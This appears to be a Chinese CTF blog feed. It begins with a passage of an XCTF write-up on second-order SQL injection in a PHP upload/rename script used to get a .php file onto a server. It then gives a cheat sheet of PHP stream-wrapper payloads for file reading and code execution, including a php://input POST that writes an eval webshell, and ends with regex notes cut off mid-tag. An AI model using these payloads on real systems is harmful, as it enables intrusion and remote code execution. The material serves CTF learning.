class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">as</span> <span class="variable">$global_var</span>) &#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$global_var</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);<span class="comment">#值是string 并且请求中的值为addslashes的值&#x27;&quot;\%00</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_DIR&quot;</span>, <span class="string">&quot;upload/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$location</span></span>) </span>&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">&#123;$location&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是数据库的配置文件的信息,对所有的提交数据进行了addslashes转义,当开启gpc魔术方法之后会产生过滤,这里发现并没有,那么如果数据库并没有使用gkb编码的话就无法宽字节绕过,这里未知所以无法直接注入</p><p><strong>upload</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午8:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>) &#123;<span class="comment">#如果是文件</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];  <span class="comment">#将upfile以数组形式进行返回</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&quot;error&quot;</span>] == UPLOAD_ERR_OK) &#123;<span class="comment">#如果上传文件没有错误的话</span></span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]);<span class="comment">#得到文件的名字并将其转换为一个全路径的字符串</span></span><br><span class="line"><span class="variable">$path_parts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>);<span class="comment">#以数组的形式返回文件的路径为一个列表其中extension就是文件的扩展名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>], <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;txt&quot;</span>))) &#123;<span class="comment">#定义白名单,如果扩展名不在这个数组里面就退出</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;error extension&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>] = <span class="string">&quot;.&quot;</span> . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#文件的扩展名前面加点</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$path_parts</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$path_parts</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#文件名字加扩展名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);</span></span><br><span class="line"><span class="comment">// Fix</span></span><br><span class="line"><span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$path_parts</span>[<span class="string">&#x27;filename&#x27;</span>]);<span class="comment">#对得到的文件名进行转义主要转义&#x27;\&quot;%00</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27; and `extension`=&#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;&quot;</span>;<span class="comment">#将文件名和扩展名进行查询</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$fetch</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;file is exists&quot;</span>);<span class="comment">#如果匹配到行数大于0就说明问文件已经存在</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], UPLOAD_DIR . <span class="variable">$name</span>)) &#123;<span class="comment">#没找到就移动文件就上传到upload/目录下面</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;<span class="subst">&#123;$path_parts[&#x27;filename&#x27;]&#125;</span>&#x27;, 0, &#x27;<span class="subst">&#123;$path_parts[&#x27;extension&#x27;]&#125;</span>&#x27;)&quot;</span>;<span class="comment">#插入file表里面filename 0 和 extension</span></span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . UPLOAD_DIR . <span class="variable">$name</span>;<span class="comment">#给出url</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;upload error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">error_get_last</span>());</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是对上传的白名单,并且仅仅是上传操作,并没有转码等操作,%00无法截断的话是无法造成.php文件的,所以直接上传是无法进行利用的.</p><p><strong>rename</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: phithon</span></span><br><span class="line"><span class="comment"> * Date: 15/10/14</span></span><br><span class="line"><span class="comment"> * Time: 下午9:39</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.inc.php&quot;</span>;<span class="comment">#加载文件一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;<span class="comment">#如果设置了老名字  设置了新名字</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);<span class="comment">#从数据库查询老名字</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();<span class="comment">#从结果级中取一行为关联数组</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="comment">#如果返回超过一行结果</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>] = <span class="title function_ invoke__">basename</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>]);<span class="comment">#reqnewname将路径中的文件名进行返回</span></span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);<span class="comment">#更新名字为新名字老命自为低了那么</span></span><br><span class="line"><span class="comment">#$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#x27;,`extension`=&#x27;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);#更新名字为新名字老命自为低了那么</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$re</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$oldname</span> = UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">&quot;filename&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#老名字等于路径加文件名加扩展名</span></span><br><span class="line"><span class="variable">$newname</span> = UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">&quot;newname&quot;</span>] . <span class="variable">$result</span>[<span class="string">&quot;extension&quot;</span>];<span class="comment">#新名字等于上传路径加新名字加扩展名</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$oldname</span>)) &#123;<span class="comment">#如果老命字存在的话</span></span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);<span class="comment">#重名名老命字为新名字</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$newname</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;<span class="subst">&#123;$url&#125;</span>\&quot; target=&#x27;_blank&#x27;&gt;<span class="subst">&#123;$url&#125;</span>&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\&quot;/\&quot;&gt;go back&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是rename重命名首先这里面的数据是从数据库中掏出来的,而从数据库中出来的数据会将在添加如数据库之前的\进行去除,那么这里就有可能造成二次注入 ,也就是先填入数据库中,在从数据库中取出来,在拼接到后面的语句上,造成二次注入.这里还有对extension与输入文件名的拼接操作,这里如果new文件名为1.php,并且extension为空的话就可以构造出.php为后缀的文件.</p><p>那么我们反过来看要输入一个新文件名字为1.php并且extension为空的话就可以利用.file_exists还要存在,这里的存在的老名字是全体名字也就是1.txt.也就是存在一个1.txt的文件那么我们要使1.txt的extension的值为空就需要利用update来注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;update `file` set `filename`=&#x27;<span class="subst">&#123;$req[&#x27;newname&#x27;]&#125;</span>&#x27;, `oldname`=&#x27;&#x27;,`extension`=&#x27;&#x27; where `fid`=<span class="subst">&#123;$result[&#x27;fid&#x27;]&#125;</span>&quot;</span>);<span class="comment">#更新名字</span></span><br></pre></td></tr></table></figure><p>也就是上传一个’,<code>extension</code>&#x3D;’.txt为后缀的文件名的文件,这里会将.txt去除因此最后拼接起来就将1.txt的extension值替换为空了,但是仔细考虑,这里接着会继续向下走,会把名字拼接成1.txt.txt,但是此时数据库里的值是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=1.txt extension=&quot;&quot;</span><br></pre></td></tr></table></figure><p>但是这里是数据库里的值,真正的upload目录下是没有1.txt这个文件的.而是1.txt.txt文件,那么如果需要绕过file_exists()的话就需要再次上传1.txt文件.</p><p>接着就是对1.txt文件改名,前面我们已经说过了,现在数据库里的1.txt文件的extension值为空,那么我们对他进行重命名时会,从数据库里去除extension的值与新文件名进行拼接,那么如果上传一个1.php就会变成1.php+’’为1.php</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203132050856.png" alt="image-20220313205016785"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203132053352.png" alt="image-20220313205305278"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203132054841.png" alt="image-20220313205436774"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203132055782.png" alt="image-20220313205517709"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203132055083.png" alt="image-20220313205547018"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203132056690.png" alt="image-20220313205633638"></p><p>连接即可</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议总结</title>
      <link href="/ctf/php%E7%9F%A5%E8%AF%86/%E5%85%B6%E4%BB%96/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/ctf/php%E7%9F%A5%E8%AF%86/%E5%85%B6%E4%BB%96/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="伪协议总结"><a href="#伪协议总结" class="headerlink" title="伪协议总结"></a>伪协议总结</h1><p>相关协议有:file:&#x2F;&#x2F;    php:&#x2F;&#x2F;filter    php:&#x2F;&#x2F;input    zip:&#x2F;&#x2F;    compress.bzip2:&#x2F;&#x2F;    compress.zilb:&#x2F;&#x2F;    data:&#x2F;&#x2F;等</p><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><p>php.ini:    PHP的配置文件</p><p>file:&#x2F;&#x2F;协议在双off的情况下也可以正常使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:off</span><br><span class="line">allow_url_include:off</span><br></pre></td></tr></table></figure><p>file:&#x2F;&#x2F;用于访问本地文件系统,在ctf中通常用来读取本地文件且不受allow_url_fopen与allow_url_include</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h3><ol><li>file:&#x2F;&#x2F; [文件的绝对路径和文件名]</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</span><br></pre></td></tr></table></figure><p>​    2.file:&#x2F;&#x2F;[文件的相对路径加文件名]</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?file=./phpcode.txt</span><br></pre></td></tr></table></figure><p>​    3.fiel:&#x2F;&#x2F;[网络路径和文件名]</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><h2 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h2><p>php:&#x2F;&#x2F;协议</p><p>不需要开启allow_url_fopen,但是php:&#x2F;&#x2F;inpt    php:&#x2F;&#x2F;stdin    php:&#x2F;&#x2F;memory    php:&#x2F;&#x2F;temp需要开启allow_url_include</p><p>php:&#x2F;&#x2F;访问各个输入输出流,在ctf中常用的是php:&#x2F;&#x2F;filter(用于读取源码)    php:&#x2F;&#x2F;input(用于执行php代码)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=off</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><h4 id="参数主要"><a href="#参数主要" class="headerlink" title="参数主要"></a>参数主要</h4><table><thead><tr><th>php:&#x2F;&#x2F;filter</th><th>解释</th></tr></thead><tbody><tr><td>resource&#x3D;[要过滤的数据]</td><td>他指定了你要过滤的数据流</td></tr><tr><td>read&#x3D;[读取的过滤器的方法]</td><td>可以指定一个或多个过滤器的名称</td></tr><tr><td>write&#x3D;[写链的过滤器的方法]</td><td>可以指定一个或多个过滤器的名称</td></tr><tr><td>[过滤器的方法]</td><td></td></tr></tbody></table><p><strong>转换过滤器</strong></p><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode 或者convert.base64-decode</td><td>相当于base64_encode()和base64_decode(),base64编码解码</td></tr><tr><td>convert.quoted-printable-encode或者convert.quoted-printable-decode</td><td>quoted-printable字符串与8-bit字符串编码解码</td></tr></tbody></table><p><strong>压缩过滤器</strong></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate或者zlib.inflate</td><td>在本地文件系统中创建gzip兼容文件的方法,但不产生命令行工具如gzip的头和尾信息.只是压缩和解压数据流中的有效载荷部分</td></tr><tr><td>bzip2.compress或者bzip2.decompress</td><td>在本地文件系统中创建bz2的兼容文件的方法</td></tr></tbody></table><p><strong>因此利用base64编码的方法</strong></p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]    读取文件源码但是对于php文件需要base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><h3 id="php-x2F-x2F-input执行代码"><a href="#php-x2F-x2F-input执行代码" class="headerlink" title="php:&#x2F;&#x2F;input执行代码"></a>php:&#x2F;&#x2F;input执行代码</h3><p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=off</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure><p>php:&#x2F;&#x2F;input</p><p>POST数据    </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php info()?&gt;</span><br></pre></td></tr></table></figure><p><strong>使用方法</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">POST 数据</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>如果有写入权限,可以写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">POST 数据</span><br><span class="line">&lt;?php fputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="zip-x2F-x2F-与bzip2-x2F-x2F-与zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-与bzip2-x2F-x2F-与zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=off</span><br><span class="line">allow_url_fopen=off</span><br></pre></td></tr></table></figure><p>zip:&#x2F;&#x2F;    bzip:&#x2F;&#x2F;    zlib:&#x2F;&#x2F;均属于压缩流,可以访问压缩文件中的子文件夹,更重要的是不需要指定后缀名,可以修改为任意后缀:jpg png gif 等等</p><h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p><strong>使用</strong></p><p>zip:&#x2F;&#x2F;[压缩文件的绝对路径]%23[压缩文件内的子文件名]    (其中的%23是#的编码)</p><p>压缩phpinfo.txt为phpinfo.zip,压缩包重命名为phpinfo.jpg,并上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="compress-bzip2-x2F-x2F-file-bz2"><a href="#compress-bzip2-x2F-x2F-file-bz2" class="headerlink" title="compress.bzip2:&#x2F;&#x2F;file.bz2"></a>compress.bzip2:&#x2F;&#x2F;file.bz2</h3><p>**使用 **</p><p>压缩phpinfo.txt为phpinfo.bz2并上传(同样支持任意后缀)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><h3 id="compress-zlib-x2F-x2F-file-gz"><a href="#compress-zlib-x2F-x2F-file-gz" class="headerlink" title="compress.zlib:&#x2F;&#x2F;file.gz"></a>compress.zlib:&#x2F;&#x2F;file.gz</h3><p><strong>使用</strong></p><p>压缩phpinfo.txt为phpinco.gz并上传(同样支持任意后缀名)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><h2 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure><p>可以使用data:&#x2F;&#x2F;数据流封装器,以传递响应格式的数据.通常可以用来执行php代码</p><p><strong>使用</strong></p><h3 id="data-x2F-x2F-text-x2F-plain-要执行的php代码"><a href="#data-x2F-x2F-text-x2F-plain-要执行的php代码" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain,[要执行的php代码]"></a>data:&#x2F;&#x2F;text&#x2F;plain,[要执行的php代码]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><h3 id="data-x2F-x2F-text-x2F-plain-base64-要执行的php代码的base64编码"><a href="#data-x2F-x2F-text-x2F-plain-base64-要执行的php代码的base64编码" class="headerlink" title="data:&#x2F;&#x2F;text&#x2F;plain;base64,[要执行的php代码的base64编码]"></a>data:&#x2F;&#x2F;text&#x2F;plain;base64,[要执行的php代码的base64编码]</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><h2 id="http-x2F-x2F-和https-x2F-x2F-协议"><a href="#http-x2F-x2F-和https-x2F-x2F-协议" class="headerlink" title="http:&#x2F;&#x2F;和https:&#x2F;&#x2F;协议"></a>http:&#x2F;&#x2F;和https:&#x2F;&#x2F;协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=on</span><br></pre></td></tr></table></figure><p>常规url形式,允许使用http1.0的get方法,以只读访问文件或资源,ctf中通常用于远程包含</p><p><strong>使用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><h2 id="phar-x2F-x2F-协议"><a href="#phar-x2F-x2F-协议" class="headerlink" title="phar:&#x2F;&#x2F;协议"></a>phar:&#x2F;&#x2F;协议</h2><p>phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似,同样可以访问zip格式压缩包内容</p><p><strong>使用</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> php知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>re正则表达式实例</title>
      <link href="/ctf/%E5%85%B6%E4%BB%96/re-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E4%BE%8B/"/>
      <url>/ctf/%E5%85%B6%E4%BB%96/re-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="eccbc87e4b5ce2fe28308fd9f2a7baf3-pdf-示例"><a href="#eccbc87e4b5ce2fe28308fd9f2a7baf3-pdf-示例" class="headerlink" title="eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例"></a>eccbc87e4b5ce2fe28308fd9f2a7baf3.pdf 示例</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">匹配这个名称  使用正则表达式首先[]表示字符集匹配集合中的任意字符[a-fA-F0-9]原因是哈希函数是只有a-f A-F 0-9 中的字符 [a-fA-F0-9]&#123;32&#125; 表示匹配前面三十二个字符 [a-fA-F0-9]&#123;32&#125;\.pdf 表示匹配.pdf这个字符</span><br></pre></td></tr></table></figure><h1 id="x2F-ph-p-3457-t-tml-x2F-i"><a href="#x2F-ph-p-3457-t-tml-x2F-i" class="headerlink" title="&#x2F;.+.ph(p[3457]?|t|tml)$&#x2F;i"></a>&#x2F;.+.ph(p[3457]?|t|tml)$&#x2F;i</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.+\.ph(p[3457]?|t|tml)$/i</span><br><span class="line">.表示匹配任何字符不/.+\.ph(p[3457]?|t|tml)$/i包括换行</span><br><span class="line">+表示匹配1个或更多个前面的标记</span><br><span class="line">ph表示匹配ph这两个字符</span><br><span class="line">p表示匹配p这个字符</span><br><span class="line">[3457]表示匹配集合中任意字符</span><br><span class="line">?表示匹配0个或者一个前面的字符</span><br><span class="line">|表示匹配或者前面的或者后面的t tml</span><br><span class="line">$表示匹配字符串的结尾</span><br><span class="line">i表示忽略大小写</span><br></pre></td></tr></table></figure><p>这里是只匹配最后一个.后面的</p><h1 id="lt-span-class-x3D-”user-name”-gt-s-d-s-lt-x2F-span-gt"><a href="#lt-span-class-x3D-”user-name”-gt-s-d-s-lt-x2F-span-gt" class="headerlink" title="&lt;span class&#x3D;”user-name”&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;"></a>&lt;span class&#x3D;”user-name”&gt;\s*(\d*)\s*&lt;&#x2F;span&gt;</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span><br><span class="line">&lt;span class=&quot;user-name&quot;&gt;表示匹配这些字符</span><br><span class="line">\s表示匹配空白字符包括空格制表符换行符*表示匹配0个或更多前面的标志</span><br><span class="line">()表示捕获分组用来创建一个整体并在下文中进行捕获也就是正则匹配到这个标志式在得到想要的值而()包括的就是想要得到的值</span><br><span class="line">\d表示匹配任意数字0-9*表示匹配0个或更多前面的标志</span><br><span class="line">而这里有r前缀表示不识别转义字符因此不用在/前加\转义</span><br></pre></td></tr></table></figure><h1 id="x2F-w-w-q-x3D-0-d-x2F"><a 